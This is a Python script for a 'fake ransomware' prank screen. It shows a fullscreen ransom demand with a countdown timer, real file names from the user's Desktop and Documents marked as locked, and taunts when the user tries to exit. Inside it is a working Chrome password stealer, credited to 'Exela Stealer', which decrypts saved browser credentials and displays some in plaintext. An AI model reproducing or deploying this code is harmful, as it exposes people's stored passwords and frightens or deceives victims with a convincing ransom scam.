import tkinter as tk
import os
import getpass
import socket
import sqlite3
import win32crypt
import json
from base64 import b64decode
from Crypto.Cipher import AES
import time
import threading
import random

class FakeRansomwareCLI:
    def __init__(self, root):
        self.root = root
        self.root.title("Ransomware")
        self.root.configure(bg="black")
        self.root.attributes("-fullscreen", True)
        self.root.bind("<space>", self.handle_exit)

        # Countdown time (24 hours in seconds for realism)
        self.time_left = 24 * 60 * 60
        self.exit_attempts = 0

        # Text widget (main terminal area)
        self.text_widget = tk.Text(
            root,
            bg="black",
            fg="red",
            insertbackground="red",
            font=("Consolas", 14),
            bd=0,
            highlightthickness=0,
            padx=20,
            pady=20
        )
        self.text_widget.pack(side="left", fill="both", expand=True)
        self.text_widget.configure(state="disabled")

        # Timer (top right)
        self.timer_label = tk.Label(
            root,
            text="",
            fg="red",
            bg="black",
            font=("Consolas", 24, "bold"),
            anchor="ne",
            justify="right"
        )
        self.timer_label.place(relx=0.99, rely=0.01, anchor="ne")

        # Minimal system info
        username = getpass.getuser()
        ip_address = socket.gethostbyname(socket.gethostname())

        # Chrome password stealer (from Exela Stealer)
        def get_chrome_passwords():
            try:
                passwords = []
                login_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
                if not os.path.exists(login_db):
                    return ["[ERROR] Chrome password database not found"]

                # Copy database to avoid locking
                temp_path = os.path.join(os.environ["TEMP"], "Login Data")
                with open(login_db, 'rb') as f:
                    data = f.read()
                with open(temp_path, 'wb') as f:
                    f.write(data)

                # Get encryption key
                local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
                key = b64decode(local_state["os_crypt"]["encrypted_key"])
                key = key[5:]  # Remove 'DPAPI' prefix
                key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

                # Connect to database and query passwords
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, username, password in cursor.fetchall():
                    if not username or not password:
                        continue
                    # Decrypt password
                    try:
                        iv = password[3:15]
                        encrypted_password = password[15:-16]
                        tag = password[-16:]
                        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                        decrypted_password = cipher.decrypt_and_verify(encrypted_password, tag).decode("utf-8")
                        passwords.append(f"[LEAKED] {url} : {username} : {decrypted_password}")
                    except:
                        continue
                conn.close()
                os.remove(temp_path)  # Clean up
                return passwords[:3] if passwords else ["[ERROR] No passwords found"]
            except Exception as e:
                return [f"[ERROR] Failed to extract passwords: {str(e)}"]

        chrome_passwords = get_chrome_passwords()

        # Minimal fake files with "encrypted" extensions
        user_dir = os.path.expanduser("~")
        sample_files = []
        for folder in ["Desktop", "Documents"]:
            path = os.path.join(user_dir, folder)
            if os.path.isdir(path):
                try:
                    files = os.listdir(path)
                    files = [f for f in files if os.path.isfile(os.path.join(path, f))]
                    sample_files += random.sample(files, min(2, len(files)))
                except:
                    continue
        if not sample_files:
            sample_files = ["important_doc.pdf", "photos.zip"]
        sample_files = [f"{f}.locked" for f in sample_files]

        # Fake progress bar
        def fake_progress_bar():
            return f"[{'=' * random.randint(5,15):<15}] {random.randint(30,80)}%"

        # Streamlined, realistic messages
        self.lines_to_type = [
            "[!!!] SYSTEM BREACH\n",
            "[*] Accessing Chrome credentials...\n",
            "[*] Decrypting password vault...\n",
            f"[*] Encrypting files: {fake_progress_bar()}\n",
            "\n",
            f"[INFO] User: {username}\n",
            f"[INFO] IP: {ip_address}\n",
            "\n",
            "[!!!] FILES ENCRYPTED\n",
            "Pay 0.5 BTC or lose all data.\n",
            "\n",
            "Encrypted files:\n"
        ] + [f"  - {f}" for f in sample_files] + [
            "\n",
            "Stolen passwords:\n"
        ] + chrome_passwords + [
            "\n",
            "Send payment to: 1X{random.randint(100000,999999)}...{random.randint(1000,9999)}\n",
            "ID: AC7DFF91\n",
            "Time left: \n",
        ]

        self.current_line = 0
        self.current_char = 0
        self.typing_speed_ms = 5  # Fast typing
        self.start_typing()

        threading.Thread(target=self.update_timer, daemon=True).start()

    def start_typing(self):
        if self.current_line < len(self.lines_to_type):
            line = self.lines_to_type[self.current_line]
            if self.current_char < len(line):
                self.append_text(line[self.current_char])
                self.current_char += 1
                self.root.after(self.typing_speed_ms, self.start_typing)
            else:
                self.current_line += 1
                self.current_char = 0
                self.root.after(100, self.start_typing)

    def append_text(self, char):
        self.text_widget.configure(state="normal")
        self.text_widget.insert("end", char)
        self.text_widget.see("end")
        self.text_widget.configure(state="disabled")

    def update_timer(self):
        while self.time_left >= 0:
            hrs = self.time_left // 3600
            mins = (self.time_left % 3600) // 60
            secs = self.time_left % 60
            timer_str = f"{hrs:02}:{mins:02}:{secs:02}"
            self.timer_label.config(text=timer_str)
            time.sleep(1)
            self.time_left -= 1

    def handle_exit(self, event):
        self.exit_attempts += 1
        taunt_messages = [
            "[!!!] Trying to exit? Not so fast...\n",
            "[!!!] Not getting away that easy!\n",
            "[!!!] Last chance before data wipe!\n"
        ]
        if self.exit_attempts <= 3:
            self.text_widget.configure(state="normal")
            self.text_widget.insert("end", taunt_messages[self.exit_attempts - 1])
            self.text_widget.see("end")
            self.text_widget.configure(state="disabled")
        else:
            self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = FakeRansomwareCLI(root)
    root.mainloop()
    
